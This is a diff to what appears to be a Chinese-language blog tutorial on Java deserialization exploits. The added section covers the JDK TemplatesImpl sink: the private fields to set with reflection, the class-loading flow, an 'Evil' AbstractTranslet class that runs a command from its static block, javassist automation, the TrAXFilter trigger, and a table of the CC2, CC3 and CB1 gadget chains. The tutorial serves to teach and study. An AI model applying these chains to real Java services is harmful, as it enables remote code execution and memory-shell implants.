@@ -295,7 +295,21 @@ ois.readObject();   // ← 弹出计算器
 
 ## 九、另一个更强的 sink：TemplatesImpl（加载任意字节码）
 
-CC6 依赖 `commons-collections`。而 `TemplatesImpl` 是 **JDK 自带**的，并且能干更狠的事——**加载攻击者提供的任意字节码**，不要求目标 classpath 上存在这个类：
+CC6 依赖 `commons-collections`。而 `TemplatesImpl` 是 **JDK 自带**的，并且能干更狠的事——**加载攻击者提供的任意字节码**，不要求目标 classpath 上存在这个类。
+
+### 9.1 它本来是干嘛的（XSLT 编译器）
+
+`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 是 JDK 里 Xalan XSLT 处理器的核心类：负责把 XSLT 样式表**编译成字节码（translet 类）并缓存**，供 XML 转换使用。它内部用一个**自定义 ClassLoader** 把"字节数组里的类"加载进 JVM。
+
+**攻击点**：它要加载的类字节码存在**私有字段 `_bytecodes`** 里，而 Java 反序列化会原样恢复私有字段——攻击者把 `_bytecodes` 填成恶意类的字节码，再让链触发 `newTransformer()`，就加载并执行了攻击者的类。
+
+### 9.2 利用要设置的三个字段
+
+| 字段 | 类型 | 作用 | 利用时的值 |
+|------|------|------|-----------|
+| `_bytecodes` | `byte[][]` | 要加载的类字节码（可多个） | `new byte[][]{恶意类字节码}` |
+| `_name` | `String` | translet 类名 | 任意非 null 字符串（为 null 会抛异常） |
+| `_tfactory` | `TransformerFactoryImpl` | 加载时要用（见 9.3） | `new TransformerFactoryImpl()` |
 
 ```java
 // setFieldValue 同 8.2 的自定义辅助方法（需自己实现，且 import java.lang.reflect.Field）
@@ -303,23 +317,81 @@ TemplatesImpl templates = new TemplatesImpl();
 setFieldValue(templates, "_bytecodes", new byte[][]{恶意类的字节码});
 setFieldValue(templates, "_name", "Evil");
 setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
-
-templates.newTransformer();
-// → 内部 defineTransletClasses() 用自定义 ClassLoader 加载 _bytecodes
-// → 实例化恶意类（须继承 AbstractTranslet）
-// → 恶意类 static{} / 构造方法执行 → RCE
 ```
-在链里它通常由 `InstantiateTransformer` 触发：
+
+### 9.3 加载流程：newTransformer → getTransletInstance → defineTransletClasses
+
+```
+templates.newTransformer()
+  → getTransletInstance()
+  │    ├─ 检查 _name != null（否则抛异常）
+  │    ├─ if (_class == null) defineTransletClasses()   ← 第一次调用才加载
+  │    └─ _translet = _class[i].newInstance()            ← 实例化 → 静态块触发！
+  → defineTransletClasses()
+       ├─ 用 _tfactory.getExternalExtensionsMap() 确保内部类加载器可用
+       ├─ loader = new TransletClassLoader(...)          ← TemplatesImpl 内部自带的 ClassLoader
+       └─ 逐个 _class[i] = loader.defineClass(_bytecodes[i])   ← 直接加载攻击者的字节码
+```
+
+**关键点**：加载用的是 `TemplatesImpl` 内部自带的 `TransletClassLoader`（重写了 `defineClass`），字节码**直接来自 `_bytecodes` 数组、不经过 classpath**——这就是"加载任意字节码"的含义。
+
+### 9.4 恶意类必须继承 AbstractTranslet
+
+`getTransletInstance()` 会把加载的类**强转成 `AbstractTranslet`** 再 `newInstance()`，所以恶意类必须继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，并实现它的两个抽象 `transform` 方法（空实现即可）。命令写在**静态块**里——类被实例化时触发 `<clinit>` 执行：
+
+```java
+public class Evil extends AbstractTranslet {
+    static {
+        Runtime.getRuntime().exec("open -a Calculator");   // ← 命令在这里
+    }
+    @Override public void transform(DOM d, SerializationHandler[] h) {}
+    @Override public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) {}
+}
+```
+
+### 9.5 恶意字节码从哪来：手动 vs 自动化
+
+字节码是 `CA FE BA BE...` 的二进制，**人没法手写**。两种造法：
+
+- **手动（理解原理用）**：写上面的 `Evil.java` → `javac` 编译 → 读 `Evil.class` 的字节塞进 `_bytecodes`；
+- **自动化（实战用）**：用 javassist 在**内存里**替你完成"写类 + 编译 + 拿字节"，只需传一条命令字符串。
+
+```java
+// 等价于"手动写 Evil.java + javac + 读字节"三步，全自动
+TemplatesImpl templates = ExploitUtil.createTemplatesImpl("open -a Calculator");
+```
+
+> 这就是无文件注入里"恶意类不在目标 classpath 也能执行"的原因——**字节码是攻击者生成的，加载由 TemplatesImpl 内部完成**。
+
+### 9.6 在链里怎么触发：TrAXFilter 构造
+
+`newTransformer()` 是 public 无参方法，但它自己不会凭空执行——在链里通常由 `InstantiateTransformer` 构造一个 `TrAXFilter` 来触发，因为 **`TrAXFilter` 的构造方法里会调 `templates.newTransformer()`**：
 
 ```
 InstantiateTransformer(TrAXFilter.class, [Templates.class], [templates])
   → new TrAXFilter(templates)
   → TrAXFilter 构造方法里调 templates.newTransformer()   ← 触发点
-  → defineClass 加载字节码 → 恶意类实例化 → RCE
+  → 进入 9.3 的加载流程 → RCE
 ```
-**为什么它重要**：
-1. **JDK 自带**，不依赖第三方库，通杀面大；
-2. **能加载任意字节码** → [《反序列化与 JNDI 无文件注入内存马》]({% post_url 2026-07-28-反序列化与JNDI无文件注入内存马 %}) 里把"注入类"送进 JVM，就是靠它（Shiro 的 CC2 / CC3 / CommonsBeanutils1 都用 TemplatesImpl）。
+
+### 9.7 为什么它"万能"
+
+1. **JDK 自带**，不依赖第三方库，通杀面大（`Runtime.exec` 那套还要 commons-collections 的 `InvokerTransformer`）；
+2. **能加载任意字节码** → 不只是执行一条命令，可以加载内存马注入类等**任意代码**——[《反序列化与 JNDI 无文件注入内存马》]({% post_url 2026-07-28-反序列化与JNDI无文件注入内存马 %}) 里把"注入类"送进 JVM，就是靠它（Shiro 的 CC2 / CC3 / CommonsBeanutils1 都用 TemplatesImpl）。
+
+### 9.8 入口 × sink：一份配方表
+
+`TemplatesImpl` 只是一个 **sink**，配上不同的入口就组成不同的链：
+
+| 入口（谁触发） | 中间 | sink = 字节码加载 | 链名 |
+|----------------|------|------------------|------|
+| `HashMap → TiedMapEntry → LazyMap` | `ChainedTransformer` | `TrAXFilter → TemplatesImpl` | **CC3** |
+| `PriorityQueue → TransformingComparator` | `InvokerTransformer("newTransformer")` | `TemplatesImpl` | **CC2** |
+| `PriorityQueue → BeanComparator` | `PropertyUtils.getProperty` | `TemplatesImpl` | **CB1** |
+
+对比入口为 `exec` 的链：`HashMap → TiedMapEntry → LazyMap` + `Runtime.exec` = **CC6**。
+
+> 反序列化链 = **入口 × sink** 的排列组合：入口解决"readObject 会自动调哪个方法"，sink 解决"最后一环干什么"。看懂这两件事，所有链都是同一张配方表。
 
 ### 常见 Sink 一览
 
